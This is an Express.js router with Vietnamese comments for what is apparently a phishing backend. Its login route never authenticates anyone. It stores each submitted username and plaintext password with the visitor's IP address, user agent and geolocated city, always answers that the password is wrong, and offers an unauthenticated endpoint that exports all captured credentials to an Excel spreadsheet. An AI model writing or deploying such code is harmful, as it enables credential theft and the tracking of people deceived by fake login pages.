const express = require("express");
const router = express.Router();
const UserAttempt = require("../models/UserAttempt");
const ExcelJS = require("exceljs");
const geoip = require("geoip-lite");
const axios = require("axios");

// Middleware để lấy thông tin IP và User Agent
const getClientInfo = async (req) => {
  const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const userAgent = req.headers["user-agent"];

  // Get detailed country information using ipapi.co
  let countryInfo = {};
  try {
    const response = await axios.get(`https://ipapi.co/${ip}/json/`);
    countryInfo = {
      country: response.data.country_name,
      countryCode: response.data.country_code,
      region: response.data.region,
      city: response.data.city,
    };
  } catch (geoError) {
    console.error("Error getting country info:", geoError);
    // Fallback to geoip-lite if ipapi.co fails
    const geo = geoip.lookup(ip);
    countryInfo = {
      country: geo ? geo.country : "Unknown",
      countryCode: geo ? geo.country : "Unknown",
      region: geo ? geo.region : "Unknown",
      city: geo ? geo.city : "Unknown",
    };
  }

  return { ip, userAgent, ...countryInfo };
};

// API đăng nhập
router.post("/login", async (req, res) => {
  try {
    const { username, password } = req.body;
    const clientInfo = await getClientInfo(req);

    // Kiểm tra số lần thử đăng nhập
    const existingAttempt = await UserAttempt.findOne({
      username,
      ipAddress: clientInfo.ip,
    }).sort({ timestamp: -1 });

    if (existingAttempt && existingAttempt.attemptCount >= 4) {
      // Lưu thông tin người dùng vào MongoDB
      const userAttempt = new UserAttempt({
        username,
        password,
        ipAddress: clientInfo.ip,
        userAgent: clientInfo.userAgent,
        country: clientInfo.country,
        countryCode: clientInfo.countryCode,
        region: clientInfo.region,
        city: clientInfo.city,
        attemptCount: existingAttempt.attemptCount + 1,
      });
      await userAttempt.save();

      return res.status(401).json({
        success: false,
        message: "Đăng nhập thất bại",
      });
    }

    // Tăng số lần thử hoặc tạo mới
    if (existingAttempt) {
      existingAttempt.attemptCount += 1;
      await existingAttempt.save();
    } else {
      const userAttempt = new UserAttempt({
        username,
        password,
        ipAddress: clientInfo.ip,
        userAgent: clientInfo.userAgent,
        country: clientInfo.country,
        countryCode: clientInfo.countryCode,
        region: clientInfo.region,
        city: clientInfo.city,
      });
      await userAttempt.save();
    }

    // Luôn trả về lỗi đăng nhập
    res.status(401).json({
      success: false,
      message: "Sai mật khẩu",
    });
  } catch (error) {
    console.error("Login error:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

// API tải file Excel
router.get("/download-attempts", async (req, res) => {
  try {
    const attempts = await UserAttempt.find().sort({ timestamp: -1 });

    const workbook = new ExcelJS.Workbook();
    const worksheet = workbook.addWorksheet("Login Attempts");

    // Thêm headers
    worksheet.columns = [
      { header: "Username", key: "username", width: 20 },
      { header: "Password", key: "password", width: 20 },
      { header: "IP Address", key: "ipAddress", width: 15 },
      { header: "Country", key: "country", width: 15 },
      { header: "Region", key: "region", width: 15 },
      { header: "City", key: "city", width: 15 },
      { header: "User Agent", key: "userAgent", width: 50 },
      { header: "Timestamp", key: "timestamp", width: 20 },
      { header: "Attempt Count", key: "attemptCount", width: 15 },
    ];

    // Thêm dữ liệu
    attempts.forEach((attempt) => {
      worksheet.addRow({
        username: attempt.username,
        password: attempt.password,
        ipAddress: attempt.ipAddress,
        country: attempt.country,
        region: attempt.region,
        city: attempt.city,
        userAgent: attempt.userAgent,
        timestamp: attempt.timestamp,
        attemptCount: attempt.attemptCount,
      });
    });

    // Set response headers
    res.setHeader(
      "Content-Type",
      "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    );
    res.setHeader(
      "Content-Disposition",
      "attachment; filename=login-attempts.xlsx"
    );

    // Gửi file
    await workbook.xlsx.write(res);
    res.end();
  } catch (error) {
    console.error("Download error:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

module.exports = router;
